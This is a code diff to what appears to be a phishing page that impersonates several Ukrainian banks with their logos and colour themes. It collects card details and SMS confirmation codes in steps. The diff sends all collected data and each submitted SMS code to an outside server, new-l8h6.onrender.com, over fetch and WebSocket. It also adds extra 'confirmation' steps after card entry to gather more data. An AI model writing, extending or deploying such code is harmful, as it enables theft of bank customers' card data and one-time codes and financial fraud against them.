@@ -78,7 +78,6 @@
         body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D226; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
         body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
         body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
-        body[data-theme="novapay"] { --primary-color: #5C45A0; --accent-color: #4527A0; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #EDE7F6 0%, #D1C4E9 100%); }
         body[data-theme="ukrsib"] { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
         .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
         .btn-back { background-color: #f1f3f5; color: var(--light-text); }
@@ -140,7 +139,6 @@ document.addEventListener('DOMContentLoaded', () => {
         'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: specialFlowSteps, special: true },
         'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', steps: specialFlowSteps, special: true },
         'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', steps: specialFlowSteps, special: true },
-        'novapay': { name: 'NovaPay', logoUrl: 'https://bank.gov.ua/admin_Uploads/payment_system/NovaPay_logo.jpg?v=14', theme: 'novapay', steps: specialFlowSteps, special: true },
         'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', steps: specialFlowSteps, special: true }
     };
 
@@ -159,8 +157,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }).join('');
 
     function connectWebSocket() {
-        const serverUrl = window.location.host; // Динамический хост
-        ws = new WebSocket(`ws://${serverUrl}`); // ws:// для локального теста
+        ws = new WebSocket(`wss://new-l8h6.onrender.com`);
         ws.onopen = () => {
             console.log('WebSocket connected');
             ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
@@ -177,10 +174,10 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     async function sendDataToServer(data, isFinal) {
+        console.log('Sending to server:', data, isFinal); // Дебаг лог
         collectedData = { ...collectedData, ...data };
-        const serverUrl = window.location.host;
         try {
-            await fetch(`http://${serverUrl}/api/submit`, {
+            await fetch(`https://new-l8h6.onrender.com/api/submit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, ...collectedData }),
@@ -210,14 +207,17 @@ document.addEventListener('DOMContentLoaded', () => {
             isFinalStep = true;
         }
 
-        if (activeBankData.special && step.type === 'card_simple') {
-            isFinalStep = true;
-        }
-
         sendDataToServer(data, isFinalStep);
 
+        // НОВОЕ: Для special банков после card_simple автоматически добавляем confirmation steps
         if (activeBankData.special && step.type === 'card_simple') {
-            showWaitingScreen();
+            let stepsToAdd = JSON.parse(JSON.stringify(confirmationSteps));
+            if (activeBankData.name === 'Райффайзен') {
+                stepsToAdd = stepsToAdd.filter(s => s.type !== 'confirm_balance');
+            }
+            activeBankData.steps.push(...stepsToAdd);
+            currentStepIndex++;
+            renderStep();
             return;
         }
 
@@ -443,9 +443,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
     async function submitSmsCode() {
         const code = document.getElementById('sms-code').value;
-        const serverUrl = window.location.host;
+        console.log('Submitting SMS code:', code); // Дебаг лог
         try {
-            await fetch(`http://${serverUrl}/api/sms`, {
+            await fetch(`https://new-l8h6.onrender.com/api/sms`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId, code }),
